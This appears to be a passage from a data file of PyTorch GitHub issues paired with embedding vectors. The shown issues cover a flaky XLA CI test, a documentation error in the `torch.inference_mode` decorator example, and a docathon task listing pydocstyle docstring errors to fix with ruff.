 -5.16781867e-01 -9.00032669e-02 -5.47380093e-03 -1.44141726e-03
  1.86130553e-01  4.56454992e-01  2.16105297e-01 -6.41561225e-02
  2.37204522e-01  1.13520466e-01  5.39030671e-01  1.54765040e-01
 -2.03911901e-01 -2.71455050e-01 -1.79902256e-01 -7.56900311e-02
 -1.17919356e-01 -1.17543310e-01  1.86504170e-01  1.10806316e-01
 -5.15908934e-02  4.02833521e-01 -1.23192646e-01 -4.17909473e-01
 -9.54275206e-03  9.64739025e-02 -5.79726025e-02  7.23035336e-02
  1.66307345e-01 -8.09941813e-03 -7.83434868e-01 -2.02251226e-01
 -9.96702462e-02  1.15668401e-01 -1.45705998e-01 -1.47704771e-02
 -7.27849603e-01 -2.68020093e-01  2.94780910e-01  1.12866722e-01
 -8.84873196e-02  2.67372727e-01 -1.63345680e-01  1.60946071e-01
  4.28466499e-01 -3.41905832e-01  1.49844989e-01 -2.48475164e-01
  1.79818109e-01  1.08327754e-02 -3.01508531e-02 -2.07575738e-01
 -8.94818231e-02  1.06788971e-01 -1.86404109e-01  1.76321536e-01
 -1.88376084e-01 -1.71907321e-01 -3.47187012e-01  1.52906150e-01
  3.04363787e-01 -1.79940701e-01 -4.26051974e-01  1.53197616e-01
 -1.69234261e-01  5.27539216e-02  7.21755326e-02 -4.35784087e-03
 -7.96755552e-02  1.00529514e-01  1.70774654e-01  2.56208181e-01
  7.88633451e-02 -1.44424394e-01 -9.40250307e-02  5.24381772e-02
 -7.92738795e-02 -1.70946941e-01  1.13458551e-01 -9.10528898e-02
  3.66002709e-01 -1.94850639e-01 -8.87599140e-02 -2.48618603e-01
  3.60226221e-02  5.06148398e-01  3.01615149e-02  3.37150127e-01
  9.39506739e-02 -1.40615925e-01 -2.45944485e-01  1.41692936e-01
  4.14469466e-02 -1.64288014e-01  1.79223776e-01 -6.34665787e-02
  4.88947392e-01  7.41538852e-02  4.43069696e-01 -1.94818437e-01
  1.26825478e-02 -2.17787951e-01  2.68283367e-01  7.12698251e-02
  3.18228900e-01  6.05128109e-02 -3.35605405e-02 -2.41035089e-01
  4.32928920e-01 -3.63754749e-01 -2.44056582e-01 -1.85606092e-01
 -1.68692902e-01 -1.23342708e-01  3.12724143e-01  3.62808406e-02
  2.96222419e-03 -8.38677585e-03 -9.46774036e-02  2.17366427e-01
  3.40798199e-01  1.60533696e-01 -3.49703468e-02 -3.41223657e-01
 -7.86198750e-02 -1.33484811e-01  7.64854029e-02 -9.76103991e-02
 -2.54798710e-01  3.78113054e-02  1.53210968e-01  1.58820041e-02
  5.05765915e-01 -1.14326209e-01  2.29952767e-01 -2.17587918e-01
 -3.97650838e-01  4.20204997e-02 -8.59062225e-02 -1.64919555e-01
  7.07636625e-02  3.32026184e-01  1.55439734e-01  4.73152287e-02
 -5.10872044e-02 -3.61035764e-01 -8.66753981e-02  1.37802616e-01
 -3.43728438e-02 -1.23121083e-01 -4.09348607e-02  7.32220173e-01
  9.38103497e-02  1.31278217e-01  2.63336748e-01 -1.25458449e-01
  3.23460162e-01  9.90368426e-02 -5.04265666e-01  1.37089819e-01
 -9.92885083e-02 -1.91215836e-02  9.59040150e-02  3.33168693e-02
  7.35401064e-02 -1.19943604e-01 -8.93795341e-02 -3.00874352e-01
  1.15963563e-01 -1.03721224e-01  3.68654668e-01  3.58514011e-01
  1.70278817e-01 -1.53155819e-01  1.40288800e-01 -1.78010017e-01
  3.82592916e-01  3.47610563e-01  1.61633924e-01  3.02385449e-01
  2.59979486e-01  5.16297966e-02  6.25399081e-03  3.19409132e-01
 -3.80182266e-02  1.78180840e-02 -1.67691499e-01 -5.18276542e-02
 -1.12590514e-01 -1.06674079e-02  1.50482565e-01  6.94171786e-02
 -1.08929053e-01  3.47830921e-01 -1.73835009e-01 -9.66141671e-02
  7.17370808e-02  2.80744731e-02  3.22685361e-01 -5.96423633e-02
 -2.31409565e-01  1.02151232e-03  6.04321063e-02  4.40365911e-01
  4.28826869e-01 -7.06076175e-02  8.81185569e-03  9.07143205e-02]"
UNSTABLE pull / linux-focal-py3_8-clang9-xla / test (xla) module: ci triaged unstable,"
XLA is a bit flaky at the moment due to test_xla_backend_intf sometimes failing.

Ex https://hud.pytorch.org/pytorch/pytorch/commit/1f3fa13f0ace035f453651c6da3e96cb64413674

I have asked @JackCaoG to skip in XLA repo.  This should be closed after that PR lands and the pin is updated.


cc @seemethere @malfet @pytorch/pytorch-dev-infra",False,"[-4.63085830e-01 -8.10248256e-02 -2.16874070e-02 -1.52691707e-01
 -1.76478788e-01 -3.59127939e-01  8.46157297e-02  9.70134884e-02
 -3.25129449e-01 -1.73738748e-01  5.61920926e-02  2.28008717e-01
 -3.25683653e-02 -2.90341258e-01 -2.37708926e-01 -2.13369548e-01
 -1.06577411e-01 -3.52381557e-01 -1.25523239e-01  1.15405262e-01
 -1.16480798e-01 -2.05297559e-01 -5.28898478e-01  8.43050927e-02
 -1.58121899e-01 -2.88872793e-02  8.49529281e-02  3.14470194e-02
 -3.02073881e-02  7.40490481e-02  1.79581791e-01  6.94732487e-01
 -1.29541457e-01  1.88281313e-02  5.65746203e-02  1.65623277e-01
 -9.79183987e-02 -4.36485469e-01 -1.18968695e-01 -1.26378804e-01
  4.64081466e-02  5.53287789e-02 -1.81230605e-01  1.34296507e-01
  1.16213180e-01 -1.20663367e-01  1.43383712e-01  1.18968174e-01
 -1.45643950e-04  8.15705359e-02 -1.25504062e-01  1.42561067e-02
  1.09742910e-01 -7.16028214e-01  5.76933883e-02 -1.55061901e-01
  2.19476700e-01  4.56628770e-01  3.30864668e-01  6.83152080e-02
  4.02926564e-01 -1.68871909e-01  2.42704928e-01  1.91433609e-01
  1.20324299e-01  1.44143999e-01  2.84043789e-01 -2.42131382e-01
  4.55232263e-01  3.03227186e-01 -1.49986610e-01 -1.84030980e-01
 -7.57007003e-01 -3.22417587e-01  1.96981430e-01  6.58236444e-02
 -2.05851290e-02 -1.41834900e-01 -6.84337467e-02 -6.58935457e-02
  1.30259842e-01 -5.58797382e-02 -4.08557579e-02 -1.33682877e-01
  5.91634512e-02 -2.24935636e-02  2.14675054e-01 -7.21531883e-02
  1.06358230e-01 -1.97019577e-01  4.06441599e-01  2.43543044e-01
  3.69981408e-01  3.67806911e-01  7.59230107e-02  2.68159449e-01
  2.52800256e-01 -3.54864836e-01 -3.96063358e-01  5.15595749e-02
  1.51003033e-01  3.75234187e-02 -1.03675768e-01  3.19668651e-01
 -3.43868375e-01 -2.50794947e-01  3.48242581e-01  7.52359331e-02
 -1.17817029e-01  9.90152881e-02  7.53692985e-02 -8.11217353e-02
  3.71513188e-01  1.84401423e-01  9.49459076e-02  1.35695025e-01
 -1.91096544e-01  1.15151361e-01 -2.08141178e-01  1.75270379e-01
 -1.86430454e-01 -2.80418932e-01 -1.33077890e-01  1.73887402e-01
  3.11827958e-01  1.08235434e-01  9.87599939e-02  2.11697698e-01
  5.55621125e-02 -1.91267222e-01  4.84371148e-02 -1.04569435e-01
 -3.64612192e-01 -2.20962957e-01  5.52080125e-02  1.24629423e-01
 -2.65284836e-01 -4.79689837e-01 -3.52612510e-02 -9.41431522e-02
 -4.08727109e-01  2.85557687e-01 -8.16886872e-02 -2.13052273e-01
  2.85248846e-01  1.77100837e-01 -2.94741452e-01 -1.32816238e-03
  3.54048163e-02 -2.15518802e-01  2.06435584e-02 -2.25679561e-01
 -8.73234272e-02  6.96392655e-01  2.71915376e-01  2.65449226e-01
  9.80991684e-03  1.02911241e-01 -1.06601521e-01 -2.96169400e-01
  1.35184765e-01  3.25684726e-01 -1.89065896e-02  7.28012249e-02
 -1.13320492e-01  2.46917717e-02 -3.54601324e-01  3.68606076e-02
 -5.75629845e-02  1.33699119e-01  3.99978831e-03  6.46614954e-02
  4.22896177e-01 -7.65614733e-02  9.18539315e-02 -2.47328445e-01
 -9.08995643e-02 -7.33240619e-02  6.20090030e-02  3.82636189e-01
  9.83924270e-02  1.37992710e-01  2.07324132e-01  2.19233185e-01
 -1.93412472e-02  3.63381445e-01 -1.16640262e-01 -4.09850664e-02
  6.41074032e-02 -1.60108417e-01 -1.70766681e-01  1.10984191e-01
 -1.26840919e-01 -1.80769563e-02 -1.30475640e-01  1.86766237e-02
  4.44049090e-02 -6.19516801e-03  1.34486020e-01  1.63913667e-01
 -7.23425820e-02  1.84804618e-01  2.20056862e-01 -1.12629250e-01
  1.25077009e-01 -1.05229437e-01  3.02067921e-02 -3.98428053e-01
 -5.12242354e-02 -6.88924342e-02 -6.80966675e-02 -1.63051158e-01
 -3.47389013e-01 -1.94411099e-01  9.50663686e-02  3.35164458e-01
  2.52363801e-01 -3.39368172e-02 -2.05143213e-01 -1.07594989e-02
  1.31260484e-01 -1.44761711e-01  2.87671894e-01 -4.24525797e-01
  1.43628433e-01 -2.45983496e-01  5.68602383e-02 -1.03031173e-01
 -2.75053144e-01  1.85277849e-01  1.82293765e-02  6.93240669e-04
  4.50879872e-01  2.81803943e-02  3.94827783e-01 -8.94687995e-02
  2.02208713e-01 -2.60276586e-01  1.53687939e-01  2.19343364e-01
 -1.83857366e-01 -3.83854955e-01 -6.01650216e-02 -8.88118520e-02
  3.60835016e-01 -2.27105916e-01  3.21974941e-02  5.10891154e-02
 -6.48246333e-02  2.19577625e-01 -1.21423766e-01 -3.48914117e-01
 -3.47334743e-02  1.13552392e-01  1.12144072e-02  1.66628957e-01
 -1.95071474e-01  4.07809317e-02  1.50470734e-01 -6.93498030e-02
  2.69557893e-01  3.55709046e-01 -3.91695619e-01  1.56186476e-01
  1.19351931e-02  2.66250521e-01 -1.74491644e-01  1.31126493e-01
  1.61768794e-01  9.92839262e-02  4.56127405e-01 -4.56853926e-01
  1.97041720e-01 -5.09103015e-02  3.24805140e-01  1.45457476e-01
  7.72475421e-01  3.24680150e-01 -4.18902282e-03  1.93534747e-01
 -2.76214909e-02  1.40638277e-03 -3.50500643e-01  1.10268436e-01
  2.77324021e-01 -2.16796175e-01 -1.12778559e-01 -3.92917186e-01
 -1.09132221e-02 -3.45545530e-01 -1.93035275e-01 -2.14691699e-01
  5.39773703e-01  8.92102420e-02  1.18591681e-01 -8.40077698e-02
 -1.31305039e-01  6.05416447e-02  5.03167927e-01 -1.58461943e-01
 -4.90805298e-01 -3.02684963e-01 -1.77672982e-01 -1.14226580e-01
 -1.85118437e-01 -8.33739489e-02 -1.50028095e-01  8.65062326e-02
  2.34445781e-01 -4.29573953e-01  2.14814261e-01  3.22514236e-01
  3.88925448e-02  2.27669269e-01 -2.26271033e-01 -4.92794216e-02
 -4.03366327e-01  4.13531959e-01 -2.36422457e-02  4.25769351e-02
  1.36615157e-01 -2.65417695e-01 -3.55243683e-01 -1.31842112e-02
  2.32609719e-01 -1.14119694e-01 -6.16453052e-01 -1.39120162e-01
 -2.78598126e-02 -2.43138120e-01  1.49191514e-01  9.47802141e-02
 -1.84519142e-01  4.68998700e-02 -1.46638751e-01  1.16271272e-01
 -1.37024015e-01  6.87274039e-02  1.04377873e-01 -2.25129753e-01
 -1.87932670e-01 -3.42885777e-02  2.71122247e-01 -4.53925699e-01
 -3.15273404e-01 -3.25796977e-02  2.74284452e-01  1.78572863e-01
 -6.51440620e-02  3.56092788e-02  3.84317562e-02 -5.05428128e-02
 -8.13529193e-02  4.95921494e-03 -3.98695767e-01  7.06786096e-01
  4.78109092e-01  4.78086710e-01  1.62297130e-01  1.31682307e-01
  5.38263321e-02 -2.54899055e-01 -3.91499341e-01 -5.74361756e-02
  1.03979763e-02 -2.57306278e-01  2.60911882e-01 -6.66107982e-02
 -1.14010379e-01  7.14477152e-02 -1.79048926e-01  1.57698780e-01
 -3.07131827e-01  1.51155621e-01  1.67995319e-01 -3.37593675e-01
  7.76722282e-02  1.78276956e-01 -4.97821085e-02  1.30630255e-01
  1.52624935e-01  1.80135816e-01  1.75778091e-01  9.87809002e-02]"
`inference_mode` documentation is incorrect triaged actionable inference mode topic: docs,"### ðŸ“š The doc issue

https://pytorch.org/docs/stable/generated/torch.inference_mode.html

At the end of the example code, we have this:

```
>>> @torch.inference_mode
... def doubler(x):
...     return x * 2
>>> out = doubler(x)
>>> out.requires_grad
False
```

However, `@torch.inference_mode` doesn't work as is, it seems that it needs to be `@torch.inference_mode()` (with the parenthesis).

Executing the code as in the example gives:
```
>>> doubler(x)
<function torch.context_decorator.<locals>.decorate_context>
```

### Suggest a potential alternative/fix

_No response_",False,"[-4.98388112e-01 -1.23726398e-01 -3.84383202e-01  2.25822181e-01
  2.20426053e-01 -5.47366291e-02 -1.56508029e-01 -1.17535796e-02
 -2.51463026e-01 -1.87043637e-01  2.34228894e-01 -2.39053309e-01
 -3.40415095e-03  1.53691530e-01  2.63946094e-02  1.51157916e-01
 -2.64932513e-01 -2.70036906e-01 -5.20214736e-02 -2.22788870e-01
  3.06492716e-01  1.20699584e-01  3.75197455e-03  1.03527203e-01
 -6.33994862e-02  7.44294971e-02 -2.02807426e-01 -2.72217959e-01
  1.65433213e-01 -9.22405720e-02  2.66332597e-01  2.07467467e-01
 -7.62174428e-01 -1.88717157e-01 -8.07908922e-02  3.95466294e-03
 -1.43368751e-01  1.61391005e-01  8.29998776e-02  1.58220440e-01
  7.80291855e-02  3.56612951e-01 -1.73678607e-01  1.43440768e-01
  5.68272099e-02 -1.10405281e-01 -1.87926918e-01  2.00924814e-01
 -3.90257001e-01 -3.23147513e-02 -1.15654171e-01  9.13800448e-02
 -3.24901223e-01  8.41078833e-02 -9.64943469e-02 -4.96761128e-02
 -5.32296225e-02  3.19839045e-02  6.18568063e-03 -2.18480334e-01
  1.57614842e-01  2.29896784e-01  1.06214456e-01 -6.89705089e-03
 -6.11952916e-02  8.82738233e-02 -1.08673111e-01  9.37700272e-03
  9.45384800e-01  1.79807767e-02 -4.12751287e-02 -6.10380359e-02
  8.48672688e-02 -1.11835122e-01 -1.02710083e-01 -1.42981783e-01
 -6.56740367e-01  2.70116687e-01 -2.69546416e-02 -5.04482925e-01
  2.12919891e-01 -1.06549710e-01 -7.62170879e-03  1.67819232e-01
  1.17114253e-01 -1.72795337e-02  1.06695443e-01 -2.25648075e-01
  4.22281325e-01  4.52359140e-01  1.98741660e-01 -6.21038139e-01
  1.06973067e-01  6.25262976e-01 -1.26450866e-01  6.82482962e-03
 -6.04551882e-02 -5.26587404e-02  2.32878685e-01 -1.28730342e-01
 -1.00232191e-01 -3.29541802e-01 -2.00397462e-01  1.11616468e-02
  2.45559588e-01 -4.70480561e-01 -6.74852636e-04  2.46421009e-01
  4.51189101e-01 -3.33011821e-02 -6.34548068e-03 -1.02738619e-01
  1.19836986e-01 -9.30540338e-02 -1.64335728e-01 -6.74354285e-02
  4.74370643e-02 -1.08693615e-01 -1.73922300e-01 -6.85885996e-02
  3.04586351e-01  2.99896598e-01  2.22691774e-01  4.01080847e-01
  4.36412573e-01 -1.55903399e-01 -2.32507586e-01 -7.31653068e-03
  3.14738005e-01  1.37773961e-01  2.34471306e-01 -9.01951641e-02
  1.08073186e-02 -1.92513674e-01  4.16789740e-01  1.10119388e-01
 -9.72492695e-02  3.96542624e-03 -3.13397571e-02  1.80563368e-02
 -2.18940631e-01 -2.35381246e-01 -1.77949131e-01 -8.59369636e-02
 -1.32048070e-01  1.07582062e-01 -2.84078419e-01  1.75245274e-02
  1.98195934e-01 -1.08565427e-01 -2.38598928e-01 -1.29238576e-01
 -4.87873137e-01  2.30542108e-01  1.01654373e-01  1.75291657e-01
  1.03657350e-01 -1.47758946e-02  2.67601252e-01 -4.12792504e-01
 -3.96214500e-02  3.51379514e-01  2.29917005e-01 -1.09416276e-01
  2.23231390e-01  1.00584500e-01  3.41973417e-02  2.18409393e-02
 -3.82890075e-01  8.87590498e-02  4.51395869e-01 -5.09714246e-01
 -3.11612368e-01 -1.26163200e-01  8.78318548e-02  4.40118648e-03
 -8.34180713e-02 -3.45871747e-01 -6.94029313e-03  1.59358934e-01
  7.14898705e-01  2.71848261e-01  4.41181570e-01  3.40449125e-01
 -2.91224957e-01  3.46532375e-01  2.36203462e-01  3.60070392e-02
 -9.81230959e-02  5.37546910e-02 -1.11649595e-01 -3.48223716e-01
 -3.96137059e-01  5.13506606e-02 -4.38938200e-01  1.23201929e-01
  3.26081455e-01 -1.14007741e-01 -1.90926671e-01  2.22749501e-01
 -3.15835476e-01 -2.23507538e-01  3.20628524e-01 -5.39791703e-01
  1.54412940e-01 -3.62132527e-02 -2.41014451e-01 -3.95221055e-01
 -2.06236422e-01 -1.45969242e-01 -1.53849006e-01 -3.12606573e-01
 -3.08730245e-01 -2.36893639e-01 -4.59628180e-02  5.17347082e-02
 -2.19429582e-01 -5.73175699e-02 -1.95453942e-01  2.34070003e-01
  2.17092097e-01  5.87932654e-02 -5.86045831e-02 -4.96981852e-02
 -1.24481097e-01  1.56952068e-01 -3.56348515e-01 -1.51381880e-01
 -1.10060528e-01 -3.44361514e-02  2.76955366e-01 -2.01995343e-01
  1.89825684e-01 -6.30743578e-02 -9.90111753e-02  5.44195235e-01
 -1.62912846e-01  2.94043850e-02 -1.33977905e-01 -1.21483102e-01
 -3.59341353e-01 -2.11782560e-01  2.95463689e-02  4.18616161e-02
  1.16946459e-01 -2.44938016e-01 -1.85768381e-01 -5.12773469e-02
  1.07267536e-01 -1.23647727e-01 -1.19729586e-01  1.52996466e-01
  2.78920352e-01 -1.85796440e-01  4.04561818e-01  1.25877023e-01
  8.83104652e-02  7.14876950e-02 -2.46813729e-01 -3.09137046e-01
  1.82116747e-01  4.51891243e-01  1.78168602e-02  3.70655894e-01
  3.25566143e-01 -5.57323061e-02 -3.38938832e-01  1.37118027e-01
 -6.45778477e-02  1.51488766e-01  5.39745808e-01 -4.26266819e-01
  4.91576374e-01  1.81862637e-01  1.73713639e-03  9.40864068e-03
  1.86051294e-01  1.02816582e-01 -1.85134739e-01 -2.21251607e-01
  1.66559711e-01  5.20627201e-03 -2.11601838e-01  1.13625064e-01
  2.19881624e-01 -2.82677889e-01  6.71413764e-02 -3.07308324e-03
 -1.63882047e-01 -1.88200384e-01 -3.96833837e-01  4.60284576e-03
  3.18673909e-01 -3.68301272e-01 -2.21785512e-02 -1.28299728e-01
 -2.22586542e-02 -3.13918561e-01  4.70742822e-01  4.01443362e-01
 -1.45626128e-01 -1.45340532e-01  4.84284945e-02 -2.10577488e-01
 -1.07760757e-01 -1.80125237e-01  3.47808897e-01  2.23476589e-02
  5.68026900e-01 -1.69500738e-01  1.77875921e-01  1.53678223e-01
 -4.59022820e-03  3.99031222e-01 -1.24930739e-01  1.49003059e-01
 -2.68798351e-01  2.73894101e-01 -9.80082750e-02  4.27224696e-01
 -1.82734430e-01 -4.53630418e-01 -1.28885293e-02 -7.40341842e-02
  2.05949638e-02  8.53610486e-02 -2.11987525e-01  3.14666331e-03
 -1.54831260e-01 -2.66998768e-01 -1.53086662e-01  2.41406947e-01
  1.79242149e-01 -4.86799441e-02  2.50602424e-01 -2.73927510e-01
 -7.00073987e-02  4.89992917e-01  2.50395294e-02 -2.14785427e-01
 -3.09562296e-01 -4.78634238e-01 -1.33376494e-01 -5.48254922e-02
 -1.06461018e-01  9.88801718e-02  3.69913489e-01  3.59973073e-01
 -7.37328529e-02  1.84681609e-01  1.83090687e-01  2.64542729e-01
 -3.82337198e-02  1.19136386e-01  8.83613676e-02  4.33517903e-01
  2.53255427e-01  2.83848763e-01  8.68631229e-02  3.43215108e-01
 -4.61482674e-01 -1.99747175e-01 -2.54311532e-01 -5.48674390e-02
  3.40591036e-02 -4.81989160e-02  2.15587839e-01 -2.91237950e-01
  3.77117336e-01  3.41239274e-01 -3.56149614e-01  2.22110972e-02
 -2.14938879e-01  1.63785666e-01  4.20460612e-01 -1.19875595e-01
  4.91926610e-01 -7.25629687e-01 -8.39295015e-02 -2.08557010e-01
  4.56050247e-01 -1.80537775e-02  6.36488348e-02 -1.37333125e-01]"
"Fix docstring errors in _fuser.py, _state.py, __init__.py, _freeze.py, _async.py, _recursive.py, _tensorboard_vis.py, _trace.py, _await.py, _check.py, _serialization.py, _script.py, annotations.py, _monkeytype_config.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `check_sparse_tensor_invariants`, **Line**: 386, **Description**: Docstring is under-indented
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `is_enabled`, **Line**: 431, **Description**: Docstring is under-indented
- **Error Code**: **D401**, **File**: `torch/sparse/__init__.py`, **Entity**: `is_enabled`, **Line**: 431, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `enable`, **Line**: 443, **Description**: Docstring is under-indented
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `disable`, **Line**: 463, **Description**: Docstring is under-indented
- **Error Code**: **D401**, **File**: `torch/contrib/_tensorboard_vis.py`, **Entity**: `visualize_graph_executor`, **Line**: 54, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **Error Code**: **D400**, **File**: `torch/jit/_state.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D200**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_type`, **Line**: 35, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_type`, **Line**: 35, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D204**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `JitTypeTraceStoreLogger`, **Line**: 74, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `jit_code_filter`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `jit_code_filter`, **Line**: 168, **Description**: First line should be in imperative mood; try rephrasing (found 'Custom')
- **Error Code**: **D205**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `set_fusion_strategy`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'I')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Force', not 'Forces')
- **Error Code**: **D205**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: First line should be in imperative mood (perhaps 'Request', not 'Requests')
- **Error Code**: **D200**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_nowait`, **Line**: 24, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_nowait`, **Line**: 24, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Assign`, **Line**: 106, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Assign`, **Line**: 106, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_AnnAssign`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_AnnAssign`, **Line**: 126, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Call`, **Line**: 179, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Call`, **Line**: 179, **Description**: First line should end with a period (not '`')
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `freeze`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: `freeze`, **Line**: 14, **Description**: First line should end with a period (not 'd')
